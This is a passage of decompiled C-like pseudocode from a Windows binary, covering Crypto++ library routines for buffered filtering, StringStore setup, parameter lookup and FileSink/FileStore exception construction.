    v11 = (*(int (__thiscall **)(_DWORD *))(*this + 168))(this);
    v12 = (*(int (__thiscall **)(int, _DWORD *, int, int, _DWORD, int))(*(_DWORD *)v11 + 140))(
            v11,
            this + 15,
            a2,
            a3,
            0,
            a5);
    this[5] = v12 != 0;
    if ( v12 )
    {
      result = 1;
      if ( (unsigned int)(a3 - this[4]) > 1 )
        return a3 - this[4];
      return result;
    }
  }
  if ( a2 && a3 )
    (*(void (__thiscall **)(_DWORD, int, int))(*(_DWORD *)this[11] + 16))(this[11], a2, a3);
  if ( !v6 )
    return 0;
  a4 = this[13];
  v21 = a4;
  v13 = (*(int (__thiscall **)(_DWORD *, _DWORD *, int))(*this + 168))(this, this + 21, a4);
  v14 = sub_4538D0(this + 6, v13, v21, (size_t)&a4, v22, v23);
  v15 = this[11];
  v24 = this[13];
  this[14] = v14;
  (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v15 + 60))(v15, v14, v24);
LABEL_15:
  v16 = this[13];
  v17 = this[14];
  v18 = (*(int (__thiscall **)(_DWORD *))(*this + 168))(this);
  v19 = v6 - 1;
  if ( !v6 )
    v19 = 0;
  v20 = (*(int (__thiscall **)(int, _DWORD *, int, int, int, int))(*(_DWORD *)v18 + 140))(
          v18,
          this + 21,
          v17,
          v16,
          v19,
          a5);
  this[5] = v20 != 0 ? 2 : 0;
  if ( !v20 )
    return 0;
  result = 1;
  if ( (unsigned int)(this[13] - this[4]) > 1 )
    return this[13] - this[4];
  return result;
}
// 4548F4: variable 'v22' is possibly undefined
// 4548F4: variable 'v23' is possibly undefined

//----- (00454960) --------------------------------------------------------
int __thiscall sub_454960(int this, int a2, int a3, int a4, int a5)
{
  int v6; // eax
  int v7; // ecx

  v6 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 168))(*(_DWORD *)(this + 12));
  v7 = 0;
  if ( *(_BYTE *)(this + 16) )
    v7 = a4;
  return (*(int (__thiscall **)(int, int, int, int, int))(*(_DWORD *)v6 + 24))(v6, a2, a3, v7, a5);
}

//----- (00454990) --------------------------------------------------------
void __thiscall sub_454990(int this, char *Src, size_t a3)
{
  unsigned int v4; // edx
  int v5; // ebx
  int v6; // esi
  int v7; // edi
  int v8; // eax
  void *v9; // ecx
  size_t v10; // eax
  size_t v11; // edi

  if ( Src && a3 )
  {
    v4 = *(_DWORD *)(this + 24);
    v5 = *(_DWORD *)(this + 12);
    v6 = *(_DWORD *)(this + 28);
    v7 = *(_DWORD *)(this + 8);
    v8 = v6 - v7;
    if ( v4 < v5 + v7 - v6 )
      v8 = *(_DWORD *)(this + 28);
    v9 = (void *)(v4 + v8);
    v10 = v7 - (v4 + v8) + v5;
    v11 = a3;
    if ( v10 < a3 )
      v11 = v10;
    memmove(v9, Src, v11);
    if ( v11 < a3 )
      memmove(*(void **)(this + 12), &Src[v11], a3 - v11);
    *(_DWORD *)(this + 24) += a3;
  }
}

//----- (00454A10) --------------------------------------------------------
int __thiscall sub_454A10(int *this, char *a2, int a3, int a4, int a5, char a6)
{
  char *v7; // eax
  bool v8; // zf
  int v9; // edx
  unsigned int v10; // ebx
  unsigned int v11; // ecx
  int v12; // edi
  int v13; // eax
  size_t v14; // ecx
  unsigned int *v15; // edx
  unsigned int v16; // edi
  unsigned int v17; // eax
  unsigned int v18; // edi
  _DWORD *v19; // edx
  unsigned int v20; // edi
  int v21; // ecx
  unsigned int v22; // eax
  bool v23; // cf
  int *v24; // ecx
  unsigned int *v25; // eax
  size_t v26; // ecx
  unsigned int v27; // edi
  int v28; // ebx
  char *v29; // eax
  size_t v30; // ebx
  int *v31; // edi
  size_t v32; // edx
  size_t v33; // eax
  size_t v34; // edi
  int v35; // ecx
  int v36; // edx
  char *v37; // eax
  size_t v38; // eax
  int v39; // edi
  int v40; // eax
  int v41; // edi
  size_t v42; // ebx
  char *v43; // eax
  size_t v44; // eax
  char *v45; // ebx
  int v46; // ecx
  unsigned int v47; // edx
  size_t v48; // eax
  size_t *v49; // ecx
  size_t *v50; // eax
  char *v51; // edx
  size_t v52; // ecx
  int v53; // eax
  int v55; // [esp-4h] [ebp-74h]
  int v56; // [esp-4h] [ebp-74h]
  int v57; // [esp+10h] [ebp-60h] BYREF
  unsigned int v58; // [esp+14h] [ebp-5Ch] BYREF
  void *Src; // [esp+18h] [ebp-58h]
  char *v60; // [esp+1Ch] [ebp-54h] BYREF
  char pExceptionObject[40]; // [esp+20h] [ebp-50h] BYREF
  size_t v62[6]; // [esp+48h] [ebp-28h] BYREF
  int v63; // [esp+6Ch] [ebp-4h]

  v7 = a2;
  Src = a2;
  if ( !(_BYTE)a5 )
  {
    sub_419B80((int)v62, "FilterWithBufferedInput");
    v63 = 0;
    sub_452740(pExceptionObject, v62);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AUBlockingInputOnly_BufferedTransformation_CryptoPP__);
  }
  if ( a3 )
  {
    v8 = *((_BYTE *)this + 36) == 0;
    v9 = this[16];
    v10 = v9 + a3;
    v58 = v9 + a3;
    if ( v8 )
    {
      v11 = this[6];
      if ( v10 < v11 )
      {
LABEL_37:
        v31 = this + 10;
        sub_454990((int)(this + 10), v7, v10 - this[16]);
        goto LABEL_39;
      }
      v57 = v11 - v9;
      sub_454990((int)(this + 10), a2, v11 - v9);
      v12 = *this;
      v13 = sub_4537D0(this + 10, (unsigned int *)this + 6);
      (*(void (__thiscall **)(int *, int))(v12 + 216))(this, v13);
      sub_454E50(this + 10, this[7], (this[8] + 2 * this[7] - 2) / (unsigned int)this[7]);
      v10 -= this[6];
      Src = (char *)Src + v57;
      v58 = v10;
      *((_BYTE *)this + 36) = 1;
    }
    v14 = this[7];
    v15 = (unsigned int *)(this + 7);
    v16 = this[8];
    if ( v14 == 1 )
    {
      if ( v10 > v16 )
      {
        v17 = this[8];
        do
        {
          v18 = v17;
          if ( !this[16] )
            break;
          v19 = this + 16;
          v20 = v10 - v17;
          v21 = this[12] - this[17];
          v60 = (char *)this[17];
          v22 = v21 + this[13];
          v58 = v20;
          v23 = this[16] < v22;
          v24 = &v57;
          v57 = v22;
          v25 = &v58;
          if ( v23 )
            v24 = this + 16;
          if ( *v24 < v20 )
            v25 = (unsigned int *)v24;
          v26 = (size_t)v60;
          v27 = *v25;
          v8 = *v19 == *v25;
          *v19 -= *v25;
          this[17] = v27 + v26;
          if ( v8 || v27 + v26 == this[13] + this[12] )
            this[17] = this[13];
          (*(void (__thiscall **)(int *, size_t, unsigned int))(*this + 228))(this, v26, v27);
          v10 -= v27;
          v18 = this[8];
          v17 = v18;
        }
        while ( v10 > v18 );
        if ( v10 > v18 )
        {
          v28 = v10 - v18;
          sub_454500(this, (int)Src, v28, a6);
          v29 = (char *)Src + v28;
          v30 = v18 - this[16];
          v31 = this + 10;
          sub_454990((int)(this + 10), v29, v30);
          goto LABEL_39;
        }
      }
    }
    else
    {
      if ( v10 >= v14 + v16 )
      {
        v32 = this[7];
        do
        {
          v33 = this[16];
          v14 = v32;
          v60 = (char *)v33;
          if ( v33 < v32 )
            break;
          v34 = this[14];
          if ( v33 < v34 )
          {
            v35 = 0;
          }
          else
          {
            v57 = this[17];
            v35 = v57;
            v36 = v57 + v34;
            if ( v57 + v34 == this[13] + this[12] )
              v36 = this[13];
            v37 = &v60[-v34];
            this[17] = v36;
            this[16] = (int)v37;
            v32 = this[7];
          }
          (*(void (__thiscall **)(int *, int, size_t))(*this + 228))(this, v35, v32);
          v14 = this[7];
          v10 -= v14;
          v16 = this[8];
          v32 = v14;
        }
        while ( v10 >= v16 + v14 );
        v58 = v10;
        v15 = (unsigned int *)(this + 7);
      }
      v60 = (char *)v14;
      if ( v10 < v14 + v16 )
      {
        v38 = (size_t)v60;
      }
      else
      {
        v38 = v14;
        if ( this[16] )
        {
          v60 = (char *)(v14 - this[16]);
          sub_454990((int)(this + 10), (char *)Src, (size_t)v60);
          v55 = this[7];
          Src = (char *)Src + (_DWORD)v60;
          v39 = *this;
          v40 = sub_453790(this + 10);
          (*(void (__thiscall **)(int *, int, int))(v39 + 228))(this, v40, v55);
          v15 = (unsigned int *)(this + 7);
          v38 = this[7];
          v10 = v58 - v38;
          v16 = this[8];
        }
      }
      if ( v10 >= v16 + v38 )
      {
        v60 = (char *)(v10 - v16);
        v41 = sub_4524F0(&v60, v15);
        sub_454500(this, (int)Src, v41, a6);
        v42 = v10 - v41 - this[16];
        v43 = (char *)Src + v41;
        v31 = this + 10;
        sub_454990((int)(this + 10), v43, v42);
        goto LABEL_39;
      }
    }
    v7 = (char *)Src;
    goto LABEL_37;
  }
  v31 = this + 10;
LABEL_39:
  if ( a4 )
  {
    if ( !*((_BYTE *)this + 36) && !this[6] )
      (*(void (__thiscall **)(int *, _DWORD))(*this + 216))(this, 0);
    v44 = this[16];
    v58 = v44;
    v62[3] = -1;
    v62[4] = v44;
    if ( v44 )
      v45 = (char *)sub_45AEA0(v44);
    else
      v45 = 0;
    v62[5] = (size_t)v45;
    v63 = 2;
    if ( v45 )
    {
      v46 = v31[3] - v31[7];
      v47 = v31[4] * v31[5];
      Src = (void *)v31[7];
      v48 = v46 + v31[2];
      v49 = (size_t *)&v60;
      v23 = v31[6] < v48;
      v60 = (char *)v48;
      if ( v23 )
        v49 = (size_t *)(v31 + 6);
      v57 = v47;
      v50 = (size_t *)&v57;
      v23 = *v49 < v47;
      v51 = (char *)Src;
      if ( v23 )
        v50 = v49;
      v52 = *v50;
      v8 = v31[6] == *v50;
      v31[6] -= *v50;
      v57 = v52;
      v60 = &v51[v52];
      v31[7] = (int)&v51[v52];
      if ( v8 || v60 == (char *)(v31[2] + v31[3]) )
        v31[7] = v31[3];
      memmove(v45, v51, v52);
      memmove(&v45[v57], (const void *)v31[7], v31[6]);
      v31[6] = 0;
    }
    (*(void (__thiscall **)(int *, char *, unsigned int))(*this + 232))(this, v45, v58);
    v56 = this[6];
    *((_BYTE *)this + 36) = 0;
    sub_454E50(v31, 1, v56);
    v53 = (*(int (__thiscall **)(int *))(*this + 168))(this);
    this[5] = (*(int (__thiscall **)(int, int *, _DWORD, _DWORD, int, int))(*(_DWORD *)v53 + 140))(
                v53,
                &dword_4EEDC0,
                0,
                0,
                a4 - 1,
                a5) != 0;
    v63 = 3;
    memset(v45, 0, v58);
    j_j___free_base(v45);
  }
  return 0;
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (00454E20) --------------------------------------------------------
int __thiscall sub_454E20(int this, int a2, int a3, int a4, int a5)
{
  int v6; // eax
  int v7; // ecx

  v6 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 12) + 168))(*(_DWORD *)(this + 12));
  v7 = 0;
  if ( *(_BYTE *)(this + 16) )
    v7 = a4;
  return (*(int (__thiscall **)(int, int, int, int, int))(*(_DWORD *)v6 + 28))(v6, a2, a3, v7, a5);
}

//----- (00454E50) --------------------------------------------------------
int __thiscall sub_454E50(_DWORD *this, int a2, int a3)
{
  int v3; // eax
  size_t v5; // ebx
  unsigned int v6; // ecx
  void *v7; // edx
  int result; // eax

  v3 = a3;
  v5 = a3 * a2;
  v6 = this[2];
  v7 = (void *)this[3];
  if ( v6 != a3 * a2 )
  {
    memset(v7, 0, v6);
    j_j___free_base(v7);
    if ( v5 )
      v7 = sub_45AEA0(v5);
    else
      v7 = 0;
    v3 = a3;
  }
  this[2] = v5;
  this[3] = v7;
  this[1] = -1;
  this[5] = v3;
  result = this[3];
  this[4] = a2;
  this[6] = 0;
  this[7] = result;
  return result;
}

//----- (00454EC0) --------------------------------------------------------
void __thiscall sub_454EC0(_DWORD *this, int a2)
{
  unsigned __int8 (__thiscall *v3)(int, const char *, void *, char *); // eax
  void *v4; // eax
  bool v5; // zf
  void *v6; // edx
  unsigned int v7; // ecx
  int v8; // eax
  char v9[4]; // [esp+Ch] [ebp-6Ch] BYREF
  void *v10; // [esp+10h] [ebp-68h]
  int v11; // [esp+14h] [ebp-64h]
  unsigned int v12; // [esp+1Ch] [ebp-5Ch]
  unsigned int v13; // [esp+20h] [ebp-58h]
  void *Block; // [esp+24h] [ebp-54h]
  char pExceptionObject[40]; // [esp+28h] [ebp-50h] BYREF
  _DWORD v16[6]; // [esp+50h] [ebp-28h] BYREF
  int v17; // [esp+74h] [ebp-4h]

  v12 = -1;
  v13 = 0;
  Block = 0;
  v10 = 0;
  v11 = 0;
  v9[0] = 0;
  v3 = *(unsigned __int8 (__thiscall **)(int, const char *, void *, char *))(*(_DWORD *)a2 + 4);
  v17 = 4;
  if ( !v3(a2, "InputBuffer", &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor', v9) )
  {
    sub_419B80((int)v16, "StringStore: missing InputBuffer argument");
    LOBYTE(v17) = 5;
    sub_405230(pExceptionObject, v16);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v4 = v10;
  v5 = v9[0] == 0;
  v6 = Block;
  v7 = v13;
  if ( v9[0] )
    v4 = Block;
  this[5] = v4;
  v8 = v11;
  if ( !v5 )
    v8 = v7;
  this[7] = 0;
  this[6] = v8;
  v17 = 6;
  if ( v12 < v7 )
    v7 = v12;
  memset(v6, 0, v7);
  j_j___free_base(v6);
}
// 454EC0: using guessed type char var_6C[4];
// 454EC0: using guessed type _DWORD var_28[6];

//----- (00454FD0) --------------------------------------------------------
int __thiscall sub_454FD0(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 168))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 128))(v1);
}

//----- (00454FF0) --------------------------------------------------------
int __thiscall sub_454FF0(_DWORD *this, int a2, _DWORD *a3, int a4, int a5)
{
  int result; // eax
  unsigned int v7; // ecx
  __int64 v8; // [esp+18h] [ebp-8h] BYREF

  v8 = 0i64;
  result = (*(int (__thiscall **)(_DWORD *, int, __int64 *, _DWORD, _DWORD, int, int))(*this + 132))(
             this,
             a2,
             &v8,
             *a3,
             a3[1],
             a4,
             a5);
  v7 = v8;
  this[7] += v8;
  *(_QWORD *)a3 = __PAIR64__(HIDWORD(v8), v7);
  return result;
}

//----- (00455040) --------------------------------------------------------
_DWORD *__thiscall sub_455040(_DWORD *this, int a2)
{
  int v3; // edi
  void (__thiscall ***v4)(_DWORD, int); // ecx
  _DWORD *result; // eax

  *this = &CryptoPP::AlgorithmParameters::`vftable';
  this[1] = 0;
  *((_BYTE *)this + 8) = *(_BYTE *)(a2 + 8);
  v3 = *(_DWORD *)(a2 + 4);
  *(_DWORD *)(a2 + 4) = 0;
  v4 = (void (__thiscall ***)(_DWORD, int))this[1];
  if ( v4 )
    (**v4)(v4, 1);
  result = this;
  this[1] = v3;
  return result;
}
// 4BBE18: using guessed type void *CryptoPP::AlgorithmParameters::`vftable';

//----- (004550C0) --------------------------------------------------------
_DWORD *__thiscall sub_4550C0(_DWORD *this)
{
  _DWORD *result; // eax

  *this = &CryptoPP::AlgorithmParameters::`vftable';
  result = this;
  this[1] = 0;
  *((_BYTE *)this + 8) = 1;
  return result;
}
// 4BBE18: using guessed type void *CryptoPP::AlgorithmParameters::`vftable';

//----- (004550E0) --------------------------------------------------------
_DWORD *__thiscall sub_4550E0(_DWORD *this, char a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx

  v3 = (void (__thiscall ***)(_DWORD, int))this[1];
  if ( v3 )
    (**v3)(v3, 1);
  *this = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (00455150) --------------------------------------------------------
char __thiscall sub_455150(_DWORD *this, char *a2, int a3, char *a4)
{
  const char **v4; // ecx

  v4 = (const char **)this[1];
  if ( v4 )
    return sub_455160(v4, a2, a3, a4);
  else
    return 0;
}

//----- (00455160) --------------------------------------------------------
char __thiscall sub_455160(const char **this, char *a2, int a3, char *a4)
{
  int v5; // eax
  int v6; // eax
  int v7; // eax
  char *v8; // eax

  v5 = strcmp(a2, "ValueNames");
  if ( v5 )
    v5 = v5 < 0 ? -1 : 1;
  if ( v5 )
  {
    while ( 1 )
    {
      v6 = strcmp(a2, this[1]);
      if ( v6 )
        v6 = v6 < 0 ? -1 : 1;
      if ( !v6 )
        break;
      this = (const char **)this[3];
      if ( !this )
        return 0;
      v7 = strcmp(a2, "ValueNames");
      if ( v7 )
        v7 = v7 < 0 ? -1 : 1;
      if ( !v7 )
        goto LABEL_11;
    }
    (*((void (__thiscall **)(const char **, char *, int, char *))*this + 1))(this, a2, a3, a4);
    *((_BYTE *)this + 9) = 1;
    return 1;
  }
  else
  {
LABEL_11:
    sub_4059C0(a2, (int)&std::string `RTTI Type Descriptor', a3);
    if ( this[3] )
      sub_455160(a2, a3, a4);
    v8 = (char *)sub_41F120(a4, (void *)this[1], strlen(this[1]));
    sub_41F120(v8, ";", 1u);
    return 1;
  }
}
// 4E9240: using guessed type void **std::string `RTTI Type Descriptor';

//----- (00455290) --------------------------------------------------------
char __thiscall sub_455290(int this, const char *a2, int a3, int a4)
{
  int v5; // ecx
  bool v6; // zf
  int v7; // ecx
  unsigned __int8 (__thiscall *v8)(int, const char *, int, int); // eax

  v5 = strcmp(a2, "ValueNames");
  if ( v5 )
    v5 = v5 < 0 ? -1 : 1;
  v6 = v5 == 0;
  v7 = *(_DWORD *)(this + 4);
  v8 = *(unsigned __int8 (__thiscall **)(int, const char *, int, int))(*(_DWORD *)v7 + 4);
  if ( v6 )
  {
    if ( !v8(v7, a2, a3, a4)
      || !(*(unsigned __int8 (__thiscall **)(_DWORD, const char *, int, int))(**(_DWORD **)(this + 8) + 4))(
            *(_DWORD *)(this + 8),
            a2,
            a3,
            a4) )
    {
      return 0;
    }
  }
  else if ( !v8(v7, a2, a3, a4)
         && !(*(unsigned __int8 (__thiscall **)(_DWORD, const char *, int, int))(**(_DWORD **)(this + 8) + 4))(
               *(_DWORD *)(this + 8),
               a2,
               a3,
               a4) )
  {
    return 0;
  }
  return 1;
}

//----- (00455320) --------------------------------------------------------
char *__thiscall sub_455320(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::FileSink::Err::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BBED8: using guessed type void *CryptoPP::FileSink::Err::`vftable';

//----- (004553B0) --------------------------------------------------------
char *__thiscall sub_4553B0(char *this, _DWORD *a2)
{
  *(_QWORD *)(this + 4) = 0i64;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 5;
  sub_419BE0((_DWORD *)this + 4, a2);
  *(_DWORD *)this = &CryptoPP::FileSink::Err::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BBED8: using guessed type void *CryptoPP::FileSink::Err::`vftable';

//----- (00455420) --------------------------------------------------------
char *__thiscall sub_455420(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::FileStore::Err::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BBE68: using guessed type void *CryptoPP::FileStore::Err::`vftable';

//----- (004554B0) --------------------------------------------------------
char *__thiscall sub_4554B0(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::FileSink::OpenErr::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BBEE4: using guessed type void *CryptoPP::FileSink::OpenErr::`vftable';

//----- (00455540) --------------------------------------------------------
char *__thiscall sub_455540(char *this, size_t *a2)
{
  size_t *v3; // edi
  unsigned int v4; // eax
  unsigned int v5; // edx
  void *v6; // ecx
  void *v8[5]; // [esp+18h] [ebp-28h] BYREF
  unsigned int v9; // [esp+2Ch] [ebp-14h]
  int v10; // [esp+3Ch] [ebp-4h]

  v3 = a2;
  v4 = a2[4] + 42;
  v10 = 0;
  v8[4] = 0;
  v9 = 15;
  LOBYTE(v8[0]) = 0;
  sub_4196B0(v8, v4);
  sub_41F120((char *)v8, "FileSink: error opening file for writing: ", 0x2Au);
  if ( a2[5] >= 0x10 )
    v3 = (size_t *)*a2;
  sub_41F120((char *)v8, v3, a2[4]);
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v10) = 1;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 5;
  sub_419BE0((_DWORD *)this + 4, v8);
  v5 = v9;
  *(_DWORD *)this = &CryptoPP::FileSink::Err::`vftable';
  if ( v5 >= 0x10 )
  {
    v6 = v8[0];
    if ( v5 + 1 >= 0x1000 )
    {
      v6 = (void *)*((_DWORD *)v8[0] - 1);
      if ( (unsigned int)(v8[0] - v6 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v6);
  }
  *(_DWORD *)this = &CryptoPP::FileSink::OpenErr::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BBED8: using guessed type void *CryptoPP::FileSink::Err::`vftable';
// 4BBEE4: using guessed type void *CryptoPP::FileSink::OpenErr::`vftable';

//----- (00455660) --------------------------------------------------------
char *__thiscall sub_455660(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::FileStore::OpenErr::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BBE74: using guessed type void *CryptoPP::FileStore::OpenErr::`vftable';

//----- (004556F0) --------------------------------------------------------
char *__thiscall sub_4556F0(char *this, size_t *a2)
{
  size_t *v3; // edi
  unsigned int v4; // eax
  unsigned int v5; // edx
  void *v6; // ecx
  void *v8[5]; // [esp+18h] [ebp-28h] BYREF
  unsigned int v9; // [esp+2Ch] [ebp-14h]
  int v10; // [esp+3Ch] [ebp-4h]

  v3 = a2;
  v4 = a2[4] + 43;
  v10 = 0;
  v8[4] = 0;
  v9 = 15;
  LOBYTE(v8[0]) = 0;
  sub_4196B0(v8, v4);
  sub_41F120((char *)v8, "FileStore: error opening file for reading: ", 0x2Bu);
  if ( a2[5] >= 0x10 )
    v3 = (size_t *)*a2;
  sub_41F120((char *)v8, v3, a2[4]);
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v10) = 1;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 5;
  sub_419BE0((_DWORD *)this + 4, v8);
  v5 = v9;
  *(_DWORD *)this = &CryptoPP::FileStore::Err::`vftable';
  if ( v5 >= 0x10 )
  {
    v6 = v8[0];
    if ( v5 + 1 >= 0x1000 )
    {
      v6 = (void *)*((_DWORD *)v8[0] - 1);
      if ( (unsigned int)(v8[0] - v6 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v6);
  }
  *(_DWORD *)this = &CryptoPP::FileStore::OpenErr::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BBE68: using guessed type void *CryptoPP::FileStore::Err::`vftable';
// 4BBE74: using guessed type void *CryptoPP::FileStore::OpenErr::`vftable';

//----- (00455810) --------------------------------------------------------
char *__thiscall sub_455810(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::FileStore::ReadErr::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BBE80: using guessed type void *CryptoPP::FileStore::ReadErr::`vftable';

//----- (004558A0) --------------------------------------------------------
char *__thiscall sub_4558A0(char *this)
{
  unsigned int v2; // edx
  void *v3; // ecx
  int v5[6]; // [esp+10h] [ebp-28h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  sub_419B80((int)v5, "FileStore: error reading file");
  v6 = 0;
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v6) = 1;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 5;
  sub_419BE0((_DWORD *)this + 4, v5);
  v2 = v5[5];
  *(_DWORD *)this = &CryptoPP::FileStore::Err::`vftable';
  if ( v2 >= 0x10 )
  {
    v3 = (void *)v5[0];
    if ( v2 + 1 >= 0x1000 )
    {
      v3 = *(void **)(v5[0] - 4);
      if ( (unsigned int)(v5[0] - (_DWORD)v3 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v3);
  }
  *(_DWORD *)this = &CryptoPP::FileStore::ReadErr::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BBE68: using guessed type void *CryptoPP::FileStore::Err::`vftable';
// 4BBE80: using guessed type void *CryptoPP::FileStore::ReadErr::`vftable';

//----- (00455970) --------------------------------------------------------
char *__thiscall sub_455970(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::FileSink::WriteErr::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BBEF0: using guessed type void *CryptoPP::FileSink::WriteErr::`vftable';

//----- (00455A00) --------------------------------------------------------
char *__thiscall sub_455A00(char *this)
{
  unsigned int v2; // edx
  void *v3; // ecx
  int v5[6]; // [esp+10h] [ebp-28h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  sub_419B80((int)v5, "FileSink: error writing file");
  v6 = 0;
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v6) = 1;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 5;
  sub_419BE0((_DWORD *)this + 4, v5);
  v2 = v5[5];
  *(_DWORD *)this = &CryptoPP::FileSink::Err::`vftable';
  if ( v2 >= 0x10 )
  {
    v3 = (void *)v5[0];
    if ( v2 + 1 >= 0x1000 )
    {
      v3 = *(void **)(v5[0] - 4);
      if ( (unsigned int)(v5[0] - (_DWORD)v3 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v3);
  }
  *(_DWORD *)this = &CryptoPP::FileSink::WriteErr::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BBED8: using guessed type void *CryptoPP::FileSink::Err::`vftable';
// 4BBEF0: using guessed type void *CryptoPP::FileSink::WriteErr::`vftable';

//----- (00455AD0) --------------------------------------------------------
int __thiscall sub_455AD0(int *this, int a2, _DWORD *a3, __int64 a4, int a5, int a6)
{
  int *v7; // ecx
  _DWORD *v8; // esi
  int v9; // eax
  int result; // eax
  _BYTE *v11; // eax
  _BYTE *v12; // edx
  int v13; // eax
  bool v14; // cf
  int v15; // ecx
  int v16; // eax
  _DWORD *v17; // edx
  int *v18; // eax
  int v19; // [esp+0h] [ebp-88h] BYREF
  __int64 v20; // [esp+10h] [ebp-78h] BYREF
  __int64 v21; // [esp+18h] [ebp-70h]
  __int128 v22; // [esp+28h] [ebp-60h]
  __m128i v23; // [esp+40h] [ebp-48h] BYREF
  __int64 v24; // [esp+50h] [ebp-38h]
